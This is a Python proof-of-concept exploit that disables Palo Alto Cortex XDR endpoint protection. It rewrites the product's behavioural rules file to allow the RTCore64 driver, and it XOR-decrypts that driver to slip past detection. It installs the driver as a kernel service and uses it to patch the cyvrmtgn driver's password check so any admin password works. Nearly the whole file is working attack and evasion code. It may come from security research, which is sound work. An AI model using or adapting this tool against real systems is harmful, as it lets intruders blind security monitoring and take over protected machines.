"""
This module provides POC about how Palo Alto Cortex XDR can be exploited.


The step taken in this POC are the following:
    1. creating an hard link to the DSE_rules_config.lua file.
    2. modify the rules in the file so the rtcore64 driver can be load without any preventions.
    3. installing RTcore64 driver (BYOVD), and using it to write over kernel addresess
    4. patching cyvrmtgn driver, to bypass the password protection mechanisem.

    After the exploit is done, you can disable the EDR completly, or perform any action
    that is require a administrator password.
    (e.g you can use the cytool CLI and run "cytool runtime stop" and any password will work)
"""
import sys
sys.path.append("..")


import os
import logging
from ctypes.wintypes import LPVOID, DWORD, LPWSTR
from ctypes import c_uint64, windll,sizeof,byref,create_unicode_buffer
import pefile
import win32service
from rtcore64 import read_memory_rtcore, write_memory_rtcore
from logger import init_logger
from cortexvortex import modify_rules_and_update, DSE_RULES_FILE


# Wanted functunality
# 1) A tool modify *any* rules that the user wants. (with main)
# 2) A POC that remove the password protection.    (with main)

# Tested on: SHA256 Cyvrmtgn.sys 4899274506D00B1F7DF83D74A8DE75290B04B40621846E0B96D874B955FC48DC


CYVRMTGN_DRIVER_PATH = os.path.join(os.environ.get('programfiles'),
                              r'Palo Alto Networks\Traps\cyvrmtgn.sys')

ENCRYPTED_RTCORE64_DRIVER_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "RTCore64_encrypted.sys")

MAX_DRIVER_PATH = 260
XOR_EAX_EAX_OPCODE = bytearray([0x33 , 0xC0])
SERVICE_AUTO_START = 0x2
SERVICE_ERROR_NORMAL = 0x1
DEFAULT_SERIVCE_NAME = "SB_service"
SERVICE_KERNEL_DRIVER = 0x1
DISTANCE_FROM_MEMCMP_FUNC = 0x13
ADMIN_PASSWORD_COMPARE_PATTERN = bytearray([0x41 ,0xB8 ,0x40 ,0x00 ,0x00 ,0x00,
                                            0x48 ,0x8D ,0x4C ,0x24 ,0x70])
ERROR_SERVICE_ALREADY_RUNNING = 0x420

# win32service.error:
ERROR_CODE = 0x0
ERROR_COMPONENT = 0x1
ERROR_MSG = 0x2

def service_install(service_name, display_name, binary_path, service_type, start_type):
    """
    Installs and starts a Windows service.
    
    (more info: https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew)
    :param service_name: The name of the service to install.
    :param display_name: The display name to be used by user
                         interface programs to identify the service.
    :param binary_path: The path to the binary executable file of the service.
    :param service_type: The service type.
    :param start_type: The service start options.
    :return: True if the driver is successfully installed, False otherwise.

    """


    hscm = win32service.OpenSCManager(None,None,win32service.SC_MANAGER_ALL_ACCESS)
    if not hscm:
        return False

    try:
        hs = win32service.OpenService(hscm, service_name, win32service.SERVICE_ALL_ACCESS)
        logging.warning("Serivce already installed")

    except win32service.error:
        hs = win32service.CreateService(hscm, service_name,
                                        display_name, win32service.SERVICE_ALL_ACCESS,
                                        service_type, start_type, SERVICE_ERROR_NORMAL,
                                        binary_path, None, 0, None, None, None)
        if hs is None:
            logging.error("Failed to create %s" , service_name)
            return False

        logging.info("Service %s was created", service_name)

    try:
        win32service.StartService(hs, None)
        logging.info("Service %s started successfully", service_name)

    except win32service.error as e:
        if e.args[ERROR_CODE] == ERROR_SERVICE_ALREADY_RUNNING:
            logging.warning("Service %s is already running", service_name)
        else:
            logging.error("An error occured at %s : %s", e.args[ERROR_COMPONENT], e.args[ERROR_MSG])

    return True

def install_vulnerable_driver(driver_path):
    """
    Installs a vulnerable driver.
    This function attempts to install a vulnerable driver as a 
    Windows service with the provided driver path.
    :param driver_path: The path to the vulnerable driver.
    :return: True if the driver is successfully installed, False otherwise.
    """
    results = None
    try:
        results = service_install(DEFAULT_SERIVCE_NAME, DEFAULT_SERIVCE_NAME,
                                 driver_path, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START)
        if not results:
            logging.error("Error occured when attempted to install the driver")

    except win32service.error as e:
        logging.error("Got exception when tried to install the driver %s",e)

    return results

def get_driver_base_address(driver_name):
    """
    Retrieves the base address of a driver in memory.

    This function enumerates the loaded device drivers and retrieves the base address 
    of the driver with the specified name. It uses Windows PSAPI functions to achieve this.

    :param driver_name: The name of the driver whose base address is to be retrieved.
    :return: A c_uint64 object representing the base address of the driver.
            If the driver is not found, returns 0.
    """

    base_address = c_uint64(0)
    drivers = (LPVOID * 1024)()
    cb_needed = DWORD()


    get_device_driver_base_name_w = windll.psapi.GetDeviceDriverBaseNameW
    get_device_driver_base_name_w.argtypes = [LPVOID, LPWSTR, DWORD]
    get_device_driver_base_name_w.restype = DWORD

    if windll.psapi.EnumDeviceDrivers(drivers,sizeof(drivers),byref(cb_needed)) \
        and cb_needed.value < sizeof(drivers):
        num_drivers = cb_needed.value // sizeof(LPVOID)
        for i in range(num_drivers):
            driver_path = create_unicode_buffer("", MAX_DRIVER_PATH)
            if get_device_driver_base_name_w(drivers[i], driver_path, sizeof(driver_path)):
                if driver_name in driver_path.value:
                    base_address = c_uint64(drivers[i])
                    break
    return base_address

def find_pattern_raw_offset(module_path, pattern):
    """
    Finds a binray pattern within the raw data of a module file
    and returns the offset where the pattern is found.

    This function reads the raw data of the module file
    specified by `module_path` and searches for the specified `pattern`
    within the data. It returns the offset in the raw data where the pattern is found.
    If the pattern is not found, it returns 0.

    :param module_path: The path to the module file.
    :param pattern: The pattern to search for within the module's raw data.
    :return: The offset within the module's raw data where the pattern is found,
    or 0 if the pattern is not found.
    """

    pattern_index = 0
    results = 0x0
    read_so_far = 0
    pattren_size = len(pattern)

    with open(module_path,'rb') as module:
        module_data = module.read()

    while pattren_size > 0 and (read_so_far+pattren_size) < len(module_data):
        read_value = module_data[read_so_far : read_so_far+pattren_size]

        if read_so_far > 0x59b40:
            pass

        for i in range(pattren_size):
            if read_value[i] != pattern[pattern_index]:
                pattren_size = len(pattern)
                pattern_index= 0
            else:
                pattren_size -= 1
                pattern_index+= 1

            read_so_far +=1

            if pattren_size == 0:
                results = read_so_far - len(pattern)
                break

    return results

def raw_to_virtual(dll_file_path, raw_offset, base_address):
    """
    Transform a raw offset within a DLL file to its corresponding 
    virtual address when loaded into memory.
    This function takes the path to a DLL file (`dll_file_path`),
    a raw offset within the DLL file (`raw_offset`),
    and the base address at which the DLL is loaded into memory (`base_address`).
    It then calculates the virtual address by adding the offset within the section to the
    base address and returns the virtual address. If the raw offset is not found
    within any section, it returns None.

    :param dll_file_path: The path to the DLL file.
    :param raw_offset: The raw offset within the DLL file.
    :param base_address: The base address at which the DLL is loaded into memory.
    :return: The virtual address corresponding to the raw offset within
            the DLL file when loaded into memory,
            or None if the raw offset is not found within any section.
    """

    pe = pefile.PE(dll_file_path)

    for section in pe.sections:
        section_start = section.PointerToRawData
        section_end = section_start + section.SizeOfRawData

        if section_start <= raw_offset < section_end:
            virtual_address = base_address + section.VirtualAddress + (raw_offset - section_start)
            return virtual_address

    return None

def find_pattern_virtual_offset(module_path, base_address, pattern):
    """
    Finds a pattern within a module file and returns its 
    corresponding virtual address when loaded into memory.

    :param module_path: The path to the module file.
    :param base_address: The base address at which the module is loaded into memory.
    :param pattern: The pattern to search for within the module's raw data.
    :return: The virtual address corresponding to the pattern within the 
    module file when loaded into memory, or None if the pattern is not found.
    """

    raw_offset = find_pattern_raw_offset(module_path,pattern)
    virtual_address = raw_to_virtual(module_path,raw_offset,base_address)
    return virtual_address

def decrypt_driver(encrypted_driver_path, key=[0xff]):
    """
    This function was added to allow dropping the entire folder to disk
    without being prevented by the XDR.

    The function decrypts the vulnerable driver using XOR decryption with the given key.

    :param file_path: The path to the file to decrypt.
    :param key: The key to use for decryption.
    :return: The name of the decrypted file.
    """
    try:
        with open(encrypted_driver_path, 'rb') as f:
            content = f.read()

        decrypted_content = bytes([byte ^ key[i % len(key)] for i, byte in enumerate(content)])

        decrypted_file_path = encrypted_driver_path.replace("encrypted","decrypted")
        with open(decrypted_file_path, 'wb') as f:
            f.write(decrypted_content)

        return decrypted_file_path
    except FileNotFoundError:
        raise FileNotFoundError(f"File not found: {encrypted_driver_path}")

    
def main():
    """
    Main function to perform a POC for bypassing Palo Alto Networks Cortex XDR:
    The steps that is being done are:

    1. Create an hardlink to the dse_rules_config.lua (behivoral rules file)
    2. modify rtcore64 rules from the DSE config file. (change the action value to be "allow")
    3. Install RTCore64 driver.
    4. Patch cyvrmtgn driver to allow any admin password to work.
    """

    init_logger()

    rule_to_modify = "rtcore64"

    # Removing rules from the dse config file (this will allow loading RTcore64 drievr later)
    logging.debug("Trying modify %s rule", rule_to_modify)

    modify_rules_and_update(DSE_RULES_FILE, rule_to_modify, "allow")

    logging.info("Decrypting RTCore64 driver ")
    decrypted_driver_path = decrypt_driver(ENCRYPTED_RTCORE64_DRIVER_PATH)
    # Installing the RTcoreDriver
    logging.info("Installing RTCore64 driver")
    if not install_vulnerable_driver(decrypted_driver_path):
        logging.error("Failed to install vulnerable driver, are you running as admin?")
        exit()


    # Patching cyvrmtgn driver (for allowing any admin password to be accepted)
    cyvrmtgn_base = get_driver_base_address("cyvrmtgn")
    if cyvrmtgn_base.value == 0:
        logging.error("Failed to obtain cyvrmtgn base address..")
        logging.error("Exiting")
        exit()

    logging.info("Got cyvrmtgn Base: %s", hex(cyvrmtgn_base.value))



    password_pattern_address = find_pattern_virtual_offset(CYVRMTGN_DRIVER_PATH,
                                                           cyvrmtgn_base.value,
                                                           ADMIN_PASSWORD_COMPARE_PATTERN)
    logging.info("Found password compare pattern at: %s", hex(password_pattern_address))

    old_value = read_memory_rtcore(2, password_pattern_address + DISTANCE_FROM_MEMCMP_FUNC)
    write_memory_rtcore(password_pattern_address+DISTANCE_FROM_MEMCMP_FUNC, XOR_EAX_EAX_OPCODE)
    new_value = read_memory_rtcore(2, password_pattern_address + DISTANCE_FROM_MEMCMP_FUNC)
    if old_value != new_value:
        logging.info("cyvrmtgn patched sucussfully!")
    else:
        logging.warning("cyvrmtgn already patched (maybe you ran this POC already?)")

    logging.info("Done")


if __name__ == "__main__":
    main()
